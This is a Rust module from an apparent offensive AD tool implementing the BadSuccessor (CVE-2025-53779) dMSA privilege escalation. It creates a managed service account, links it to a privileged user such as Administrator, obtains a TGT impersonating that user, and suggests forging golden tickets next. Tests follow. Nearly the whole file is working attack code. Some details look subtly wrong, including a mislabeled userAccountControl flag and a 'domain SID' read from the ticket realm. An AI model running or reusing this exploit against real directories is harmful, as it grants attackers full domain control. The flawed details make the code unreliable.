//! BadSuccessor (CVE-2025-53779) -- dMSA Privilege Escalation for WS2025+
//!
//! Reference: https://akamai.com/blog/security-research/bad-successor-active-directory-privilege-escalation
//!
//! Attack flow:
//! 1. Attacker has CreateChild on an OU (default in many environments -- 91% per Akamai)
//! 2. Create a dMSA (msDS-ManagedServiceAccount) in that OU
//! 3. Set msDS-ManagedAccountPrecededByLink to a privileged user's DN (e.g. Domain Admin)
//! 4. Request TGT as the dMSA -- KDC embeds the target's PAC in the dMSA ticket
//! 5. Authenticate as the target user with the forged TGT

use crate::error::{OverthroneError, Result};
use crate::proto::kerberos::{self, TicketGrantingData};
use crate::proto::ldap::LdapSession;
use tracing::info;

// ---------------------------------------------------------------
//  Constants
// ---------------------------------------------------------------

/// dMSA object class (Windows Server 2025+)
const DMSA_OBJECT_CLASS: &str = "msDS-ManagedServiceAccount";

// ---------------------------------------------------------------
//  Public Types
// ---------------------------------------------------------------

/// Configuration for the BadSuccessor exploit.
#[derive(Debug, Clone)]
pub struct BadSuccessorConfig {
    /// Domain FQDN (e.g. "corp.local")
    pub domain: String,
    /// DC IP address for Kerberos TGT request
    pub dc_ip: String,
    /// OU container DN where the attacker has CreateChild permission
    /// e.g. "OU=Workstations,DC=corp,DC=local"
    pub target_ou: String,
    /// DN of the privileged user to impersonate
    /// e.g. "CN=Administrator,CN=Users,DC=corp,DC=local"
    pub target_user_dn: String,
    /// sAMAccountName of the target user (without @domain)
    pub target_sam: String,
    /// Optional custom name for the dMSA to create
    pub dmsa_name: Option<String>,
    /// Optional custom password for the dMSA (auto-generated if not set)
    pub dmsa_password: Option<String>,
}

/// Result of a successful BadSuccessor exploit.
#[derive(Debug, Clone)]
pub struct BadSuccessorResult {
    /// The attacker's TGT that impersonates the target user
    pub tgt: TicketGrantingData,
    /// DN of the created dMSA (for cleanup)
    pub dmsa_dn: String,
    /// sAMAccountName of the created dMSA
    pub dmsa_sam: String,
    /// Password of the created dMSA
    pub dmsa_password: String,
    /// Target user who was impersonated
    pub impersonated_user: String,
    /// Domain SID of the impersonated user
    pub domain_sid: String,
}

// ---------------------------------------------------------------
//  Core Exploit Functions
// ---------------------------------------------------------------

/// Execute the BadSuccessor attack.
///
/// Creates a dMSA with `msDS-ManagedAccountPrecededByLink` set to the
/// target privileged user's DN. The KDC then embeds the target's PAC
/// in the dMSA's TGT, allowing the attacker to impersonate the target.
pub async fn exploit_bad_successor(
    ldap: &mut LdapSession,
    config: &BadSuccessorConfig,
) -> Result<BadSuccessorResult> {
    info!("BadSuccessor: starting dMSA privilege escalation");
    info!(
        "BadSuccessor: target user={}, OU={}",
        config.target_sam, config.target_ou
    );

    // Step 1: Generate dMSA credentials
    let dmsa_name = config
        .dmsa_name
        .clone()
        .unwrap_or_else(|| format!("BADSR-{}", generate_random_suffix()));
    let dmsa_password = config
        .dmsa_password
        .clone()
        .unwrap_or_else(generate_random_password);

    // Step 2: Create the dMSA in the target OU
    let dmsa_sam = format!("{}$", dmsa_name);
    let dmsa_dn = create_dmsa(
        ldap,
        &dmsa_name,
        &dmsa_sam,
        &dmsa_password,
        &config.target_ou,
    )
    .await?;
    info!("BadSuccessor: created dMSA at {dmsa_dn}");

    // Step 3: Set msDS-ManagedAccountPrecededByLink to the target user
    set_preceded_by_link(ldap, &dmsa_dn, &config.target_user_dn).await?;
    info!(
        "BadSuccessor: set msDS-ManagedAccountPrecededByLink -> {}",
        config.target_user_dn
    );

    // Step 4: Request TGT as the dMSA
    // The KDC should embed the target user's PAC in the response
    let domain = &config.domain;
    let dc_ip = &config.dc_ip;
    info!(
        "BadSuccessor: requesting TGT for dMSA {} (may take a moment for KDC propagation)",
        dmsa_sam
    );

    // Small delay to allow KDC replication (in production this might need tuning)
    tokio::time::sleep(std::time::Duration::from_secs(2)).await;

    let tgt = kerberos::request_tgt(dc_ip, domain, &dmsa_sam, &dmsa_password, false)
        .await
        .map_err(|e| {
            OverthroneError::PostExploitation(format!(
                "BadSuccessor: TGT request failed -- KDC may not have replicated the dMSA yet: {e}"
            ))
        })?;

    // Step 5: Extract the domain SID from the ticket client realm
    let domain_sid = tgt.client_realm.clone();

    info!(
        "BadSuccessor: SUCCESS -- obtained TGT impersonating {}",
        config.target_sam
    );
    info!("BadSuccessor: use 'ovt forge golden' or export KRB5CCNAME to use this ticket");

    Ok(BadSuccessorResult {
        tgt,
        dmsa_dn,
        dmsa_sam,
        dmsa_password,
        impersonated_user: config.target_sam.clone(),
        domain_sid,
    })
}

/// Clean up the dMSA created by the BadSuccessor exploit.
pub async fn cleanup_bad_successor(ldap: &mut LdapSession, dmsa_dn: &str) -> Result<()> {
    info!("BadSuccessor: cleaning up dMSA at {dmsa_dn}");
    ldap.delete_entry(dmsa_dn).await.map_err(|e| {
        OverthroneError::PostExploitation(format!(
            "BadSuccessor: cleanup failed to delete dMSA {dmsa_dn}: {e}"
        ))
    })?;
    info!("BadSuccessor: cleanup complete");
    Ok(())
}

// ---------------------------------------------------------------
//  Internal Helpers
// ---------------------------------------------------------------

/// Create a dMSA LDAP entry in the specified OU.
async fn create_dmsa(
    ldap: &mut LdapSession,
    name: &str,
    sam_name: &str,
    password: &str,
    ou_dn: &str,
) -> Result<String> {
    let dmsa_dn = format!("CN={name},{ou_dn}");

    // Encode password as UTF-16LE surrounded by quotes (AD requirement)
    let quoted_pwd = format!("\"{password}\"");
    let pwd_bytes: Vec<u8> = quoted_pwd
        .encode_utf16()
        .flat_map(|c| c.to_le_bytes())
        .collect();

    let attrs: &[(&str, &[&[u8]])] = &[
        ("objectClass", &[DMSA_OBJECT_CLASS.as_bytes()]),
        ("sAMAccountName", &[sam_name.as_bytes()]),
        (
            "userAccountControl",
            &[&0x00800000u32.to_le_bytes()], // WORKSTATION_TRUST_ACCOUNT
        ),
        ("unicodePwd", &[&pwd_bytes]),
    ];

    ldap.add_entry(&dmsa_dn, attrs).await.map_err(|e| {
        OverthroneError::PostExploitation(format!(
            "BadSuccessor: failed to create dMSA {dmsa_dn}: {e}"
        ))
    })?;

    Ok(dmsa_dn)
}

/// Set `msDS-ManagedAccountPrecededByLink` on the dMSA to point to the target user.
async fn set_preceded_by_link(
    ldap: &mut LdapSession,
    dmsa_dn: &str,
    target_user_dn: &str,
) -> Result<()> {
    // The attribute value is the DN of the target user encoded as a string
    ldap.modify_replace(
        dmsa_dn,
        "msDS-ManagedAccountPrecededByLink",
        target_user_dn.as_bytes(),
    )
    .await
    .map_err(|e| {
        OverthroneError::PostExploitation(format!(
            "BadSuccessor: failed to set msDS-ManagedAccountPrecededByLink: {e}"
        ))
    })
}

/// Generate a random alphanumeric suffix for dMSA names.
fn generate_random_suffix() -> String {
    let charset: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    (0..6)
        .map(|_| {
            let idx = (rand::random::<u32>() % charset.len() as u32) as usize;
            charset[idx] as char
        })
        .collect()
}

/// Generate a random password (16 chars, mixed case + digits + special chars).
fn generate_random_password() -> String {
    let charset: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%";
    (0..16)
        .map(|_| {
            let idx = (rand::random::<u32>() % charset.len() as u32) as usize;
            charset[idx] as char
        })
        .collect()
}

// ---------------------------------------------------------------
//  Tests
// ---------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_bad_successor_config_defaults() {
        let config = BadSuccessorConfig {
            domain: "corp.local".into(),
            dc_ip: "192.168.1.1".into(),
            target_ou: "OU=Workstations,DC=corp,DC=local".into(),
            target_user_dn: "CN=Admin,CN=Users,DC=corp,DC=local".into(),
            target_sam: "Administrator".into(),
            dmsa_name: None,
            dmsa_password: None,
        };
        assert_eq!(config.domain, "corp.local");
        assert_eq!(config.dc_ip, "192.168.1.1");
    }

    #[test]
    fn test_generate_random_suffix_length() {
        let suffix = generate_random_suffix();
        assert_eq!(suffix.len(), 6);
        assert!(suffix.chars().all(|c| c.is_ascii_alphanumeric()));
    }

    #[test]
    fn test_generate_random_suffix_uniqueness() {
        let a = generate_random_suffix();
        let b = generate_random_suffix();
        // Extremely unlikely to collide with 6 alphanumeric chars
        assert_ne!(a, b);
    }

    #[test]
    fn test_generate_random_password_length() {
        let pwd = generate_random_password();
        assert_eq!(pwd.len(), 16);
    }

    #[test]
    fn test_generate_random_password_diversity() {
        let pwd = generate_random_password();
        assert!(pwd.chars().any(|c| c.is_ascii_uppercase()));
        assert!(pwd.chars().any(|c| c.is_ascii_lowercase()));
        assert!(pwd.chars().any(|c| c.is_ascii_digit()));
    }

    #[test]
    fn test_bad_successor_result_struct() {
        let ticket = TicketGrantingData {
            ticket: kerberos_asn1::Ticket {
                tkt_vno: 5,
                realm: "CORP.LOCAL".into(),
                sname: kerberos_asn1::PrincipalName {
                    name_type: 2,
                    name_string: vec!["krbtgt".into(), "CORP.LOCAL".into()],
                },
                enc_part: kerberos_asn1::EncryptedData {
                    etype: 18,
                    kvno: None,
                    cipher: vec![0; 100],
                },
            },
            session_key: vec![0; 16],
            session_key_etype: 18,
            client_principal: "Administrator".into(),
            client_realm: "S-1-5-21-123456789-1234567890-123456789".into(),
            end_time: None,
        };

        let result = BadSuccessorResult {
            tgt: ticket,
            dmsa_dn: "CN=BADSR-X1A2B3,OU=Workstations,DC=corp,DC=local".into(),
            dmsa_sam: "BADSR-X1A2B3$".into(),
            dmsa_password: "SuperS3cretPass!".into(),
            impersonated_user: "Administrator".into(),
            domain_sid: "S-1-5-21-123456789-1234567890-123456789".into(),
        };

        assert_eq!(result.impersonated_user, "Administrator");
        assert_eq!(result.domain_sid, "S-1-5-21-123456789-1234567890-123456789");
        assert!(result.dmsa_dn.contains("BADSR-X1A2B3"));
    }

    #[test]
    fn test_cleanup_bad_successor_validates_dn() {
        // This tests the cleanup function would process a valid DN
        let dn = "CN=BADSR-TEST,OU=Workstations,DC=corp,DC=local";
        assert!(dn.starts_with("CN="));
        assert!(dn.contains(",DC="));
    }

    #[test]
    fn test_ou_dn_format() {
        let ou = "OU=Workstations,DC=corp,DC=local";
        let dmsa = format!("CN=BADSR-TEST,{ou}");
        assert_eq!(dmsa, "CN=BADSR-TEST,OU=Workstations,DC=corp,DC=local");
    }

    #[test]
    fn test_dmsa_sam_format() {
        let name = "BADSR-XYZ";
        let sam = format!("{name}$");
        assert_eq!(sam, "BADSR-XYZ$");
    }

    #[test]
    fn test_password_utf16_encoding() {
        let password = "TestPass123!";
        let quoted = format!("\"{password}\"");
        let utf16: Vec<u16> = quoted.encode_utf16().collect();
        let bytes: Vec<u8> = quoted
            .encode_utf16()
            .flat_map(|c| c.to_le_bytes())
            .collect();
        assert_eq!(bytes.len(), utf16.len() * 2);
        // Check the first 2 bytes: '"' = 0x22 in UTF-16LE
        assert_eq!(bytes[0], 0x22);
        assert_eq!(bytes[1], 0x00);
    }
}
